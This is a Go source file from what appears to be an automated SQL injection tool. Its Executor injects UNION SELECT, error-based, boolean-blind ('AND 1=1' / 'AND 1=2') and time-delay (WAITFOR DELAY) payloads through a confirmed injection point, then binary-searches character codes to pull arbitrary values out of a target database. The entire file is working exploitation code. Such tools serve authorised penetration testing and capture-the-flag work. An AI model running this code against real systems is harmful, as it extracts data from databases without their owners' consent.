package core

import (
	"fmt"
	"regexp"
	"strings"
	"time"
)

// Executor turns a scalar SQL expression into a value by using the technique
// that was confirmed for the current session.
type Executor struct {
	E       *Engine
	S       *Session
	Dialect *Dialect

	trueBody  string
	falseBody string
	baseline  time.Duration
}

func NewExecutor(e *Engine, s *Session) *Executor {
	d := GetDialect(s.DBMS)
	if d == nil {
		d = mysqlDialect()
	}
	return &Executor{E: e, S: s, Dialect: d}
}

func (x *Executor) ensureBaseline() {
	if x.baseline == 0 {
		x.baseline = x.E.baselineLatency(x.S.Point)
	}
}

// Request injects a fragment using the confirmed boundary.
func (x *Executor) Request(fragment string) (string, int, error) {
	payload := x.S.Boundary.Prefix + fragment + x.S.Boundary.Suffix
	body, length, _, err := x.E.RequestAt(x.S.Point, payload)
	return body, length, err
}

var markerRE = regexp.MustCompile(`~([^~]*)~`)

func extractMarker(body string) string {
	matches := markerRE.FindAllStringSubmatch(body, -1)
	if len(matches) == 0 {
		return ""
	}
	// Prefer the longest match, which is usually the injected value.
	best := ""
	for _, m := range matches {
		if len(m) > 1 && len(m[1]) > len(best) {
			best = m[1]
		}
	}
	return decodeSeparators(best)
}

// decodeSeparators restores row and column separators that were escaped by a
// JSON response. HTML responses contain the control characters directly, so
// the replacement is a no-op for them.
func decodeSeparators(value string) string {
	replacer := strings.NewReplacer(
		`\u001e`, "\x1e",
		`\u001E`, "\x1e",
		`\u001f`, "\x1f",
		`\u001F`, "\x1f",
		`\x1e`, "\x1e",
		`\x1f`, "\x1f",
	)
	return replacer.Replace(value)
}

// scalarExpr makes a free-form SELECT usable as a scalar subquery. Without
// the parentheses, an expression such as "SELECT flag FROM secrets" cannot be
// concatenated into a marker expression.
func scalarExpr(expr string) string {
	expr = strings.TrimSpace(expr)
	if expr == "" {
		return expr
	}
	return "(" + expr + ")"
}

// Scalar extracts a single value from the target database.
func (x *Executor) Scalar(expr string) (string, error) {
	forced := strings.ToLower(strings.TrimSpace(x.E.Opts.ExtractTechnique))
	if forced == "" || forced == "auto" {
		forced = strings.ToLower(strings.TrimSpace(x.E.Opts.Technique))
	}
	if forced == "blind" {
		forced = "boolean"
	}

	var techniques []string
	switch forced {
	case "union", "error", "boolean", "time":
		// The caller explicitly selected a technique. Do not silently use a
		// different one, because that changes the traffic profile and can
		// bypass the operator's intent.
		techniques = []string{forced}
	default:
		// In-band UNION extraction is the fastest and least noisy technique.
		if x.S.Columns > 0 && x.S.StringCol >= 0 {
			techniques = append(techniques, "union")
		}
		if x.S.Technique != "" && x.S.Technique != "auto" {
			techniques = append(techniques, x.S.Technique)
		}
		for _, t := range []string{"union", "error", "boolean", "time"} {
			found := false
			for _, existing := range techniques {
				if existing == t {
					found = true
					break
				}
			}
			if !found {
				techniques = append(techniques, t)
			}
		}
	}

	var lastErr error
	for _, technique := range techniques {
		var value string
		var err error
		switch technique {
		case "union":
			value, err = x.unionScalar(expr)
		case "error":
			value, err = x.errorScalar(expr)
		case "boolean":
			value, err = x.booleanScalar(expr)
		case "time":
			value, err = x.timeScalar(expr)
		default:
			continue
		}
		if err == nil && value != "" {
			if x.S.Technique != technique {
				x.S.Technique = technique
			}
			return value, nil
		}
		if err != nil {
			lastErr = err
		}
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no extraction technique succeeded")
	}
	return "", lastErr
}

// Strings extracts a list of values. The SQL expression must aggregate rows
// with the dialect row separator (char 30).
func (x *Executor) Strings(expr string) ([]string, error) {
	value, err := x.Scalar(expr)
	if err != nil {
		return nil, err
	}
	return splitRowValues(value), nil
}

func splitRowValues(value string) []string {
	value = strings.ReplaceAll(value, "\x1e", "\n")
	parts := strings.Split(value, "\n")
	out := make([]string, 0, len(parts))
	seen := map[string]bool{}
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" || seen[p] {
			continue
		}
		seen[p] = true
		out = append(out, p)
	}
	return out
}

func (x *Executor) unionScalar(expr string) (string, error) {
	if x.S.Columns <= 0 {
		cols, col, ok := x.E.DetectUnionColumns(x.S)
		if !ok {
			return "", fmt.Errorf("union column detection failed")
		}
		x.S.Columns = cols
		x.S.StringCol = col
	}
	if x.S.StringCol < 0 {
		return "", fmt.Errorf("no string-compatible union column")
	}

	marked := x.Dialect.Marker(scalarExpr(expr))
	nulls := make([]string, x.S.Columns)
	for i := range nulls {
		nulls[i] = "NULL"
	}
	nulls[x.S.StringCol] = marked
	fragment := " UNION SELECT " + strings.Join(nulls, ",")
	body, _, err := x.Request(fragment)
	if err != nil {
		return "", err
	}
	if value := extractMarker(body); value != "" {
		return value, nil
	}
	return "", fmt.Errorf("union marker not found in response")
}

func (x *Executor) errorScalar(expr string) (string, error) {
	errExpr, ok := x.Dialect.ErrorExpr(scalarExpr(expr))
	if !ok {
		return "", fmt.Errorf("error-based extraction not supported for %s", x.Dialect.Name)
	}
	body, _, err := x.Request(" AND " + errExpr)
	if err != nil {
		return "", err
	}
	if value := extractMarker(body); value != "" {
		return value, nil
	}
	return "", fmt.Errorf("error marker not found in response")
}

func (x *Executor) booleanScalar(expr string) (string, error) {
	length, err := x.blindLength(expr)
	if err != nil {
		return "", err
	}

	if length <= 0 {
		return "", nil
	}
	if length > 512 {
		length = 512
	}
	var builder strings.Builder
	for pos := 1; pos <= length; pos++ {
		ch, err := x.blindChar(expr, pos)
		if err != nil {
			return builder.String(), err
		}
		if ch == 0 {
			break
		}
		builder.WriteByte(byte(ch))
	}
	return builder.String(), nil
}

func (x *Executor) timeScalar(expr string) (string, error) {
	length, err := x.timeLength(expr)
	if err != nil {
		return "", err
	}
	if length <= 0 {
		return "", nil
	}
	if length > 512 {
		length = 512
	}
	var builder strings.Builder
	for pos := 1; pos <= length; pos++ {
		ch, err := x.timeChar(expr, pos)
		if err != nil {
			return builder.String(), err
		}
		if ch == 0 {
			break
		}
		builder.WriteByte(byte(ch))
	}
	return builder.String(), nil
}

func (x *Executor) blindLength(expr string) (int, error) {
	cond := fmt.Sprintf("%s >= %%d", x.Dialect.Length(scalarExpr(expr)))
	return x.binarySearch(0, 512, func(mid int) bool {
		return x.booleanOracle(fmt.Sprintf(cond, mid))
	})
}

func (x *Executor) blindChar(expr string, pos int) (int, error) {
	sub := x.Dialect.Substr(scalarExpr(expr), pos, 1)
	ascii := x.Dialect.ASCII(sub)
	return x.binarySearch(31, 127, func(mid int) bool {
		return x.booleanOracle(fmt.Sprintf("%s >= %d", ascii, mid))
	})
}

func (x *Executor) timeLength(expr string) (int, error) {
	cond := fmt.Sprintf("%s >= %%d", x.Dialect.Length(scalarExpr(expr)))
	return x.binarySearch(0, 256, func(mid int) bool {
		return x.timeOracle(fmt.Sprintf(cond, mid))
	})
}

func (x *Executor) timeChar(expr string, pos int) (int, error) {
	sub := x.Dialect.Substr(scalarExpr(expr), pos, 1)
	ascii := x.Dialect.ASCII(sub)
	return x.binarySearch(31, 127, func(mid int) bool {
		return x.timeOracle(fmt.Sprintf("%s >= %d", ascii, mid))
	})
}

// binarySearch finds the largest value for which predicate is true. The
// predicate is expected to be monotonic, which is the case for length and
// ASCII comparisons.
func (x *Executor) binarySearch(low, high int, predicate func(int) bool) (int, error) {
	result := low
	for low <= high {
		mid := (low + high) / 2
		if predicate(mid) {
			result = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
	}
	return result, nil
}

// booleanOracle evaluates a condition by comparing its response with known
// true and false reference responses. Comparing the condition against its own
// negation is not sufficient: both requests differ from each other whether the
// condition is true or false.
func (x *Executor) booleanOracle(cond string) bool {
	if x.trueBody == "" || x.falseBody == "" {
		x.trueBody = x.booleanRequest(" AND 1=1")
		x.falseBody = x.booleanRequest(" AND 1=2")
	}
	if x.trueBody == "" || x.falseBody == "" || !responsesDiffer(x.trueBody, x.falseBody) {
		return false
	}
	body := x.booleanRequest(" AND (" + cond + ")")
	if body == "" {
		return false
	}
	return responsesSimilar(body, x.trueBody) && responsesDiffer(body, x.falseBody)
}

func (x *Executor) booleanRequest(fragment string) string {
	body, _, err := x.Request(fragment)
	if err != nil {
		return ""
	}
	return body
}

func (x *Executor) timeOracle(cond string) bool {
	x.ensureBaseline()
	delay := x.E.Opts.TimeSecs
	if delay <= 0 {
		delay = 3
	}
	payload := x.timePayload(cond, delay)
	samples := []time.Duration{}
	for i := 0; i < 2; i++ {
		_, _, _, err := x.E.RequestAt(x.S.Point, payload)
		if err != nil {
			return false
		}
		samples = append(samples, x.E.LastResponseTime)
	}
	return medianDuration(samples) > x.baseline+2*time.Second
}

func (x *Executor) timePayload(cond string, delay int) string {
	switch strings.ToLower(x.Dialect.Name) {
	case "mssql", "sybase":
		return x.S.Boundary.Prefix + "; IF (" + cond + ") WAITFOR DELAY '0:0:" + fmt.Sprintf("%d", delay) + "'" + x.S.Boundary.Suffix
	default:
		return x.S.Boundary.Prefix + " AND " + x.Dialect.TimeCondition(cond, delay) + x.S.Boundary.Suffix
	}
}

// SQLQuery runs a free-form scalar SQL expression and returns the result.
func (x *Executor) SQLQuery(query string) (string, error) {
	return x.Scalar(query)
}
